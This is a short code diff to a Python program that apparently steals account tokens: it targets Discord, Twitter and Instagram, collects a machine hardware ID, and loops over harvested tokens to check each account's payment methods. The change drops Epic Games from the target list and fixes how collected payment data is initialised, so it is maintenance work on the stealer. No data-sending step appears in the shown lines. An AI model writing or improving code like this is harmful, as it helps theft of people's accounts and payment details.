@@ -25,7 +25,7 @@ from zipfile import ZipFile, ZIP_DEFLATED
 from cpuinfo import get_cpu_info
 from multiprocessing import freeze_support
 
-website = ['discord.com', 'twitter.com', 'instagram.com', 'epicgames.com']
+website = ['discord.com', 'twitter.com', 'instagram.com']
 
 def get_hwid():
     p = Popen('wmic csproduct get uuid', shell=True, stdout=PIPE, stderr=PIPE)
@@ -180,8 +180,9 @@ def main():
             for x in insta_lst:
                 for y in x:
                     x[x.index(y)] = y[1]
+    all_data_p = []
     for x in tokens:
-        all_data_p, lst_b = [] ,has_payment_methods(x)
+        lst_b = has_payment_methods(x)
         try:
             for n in range(len(lst_b)):
                 if lst_b[n]['type'] == 1:
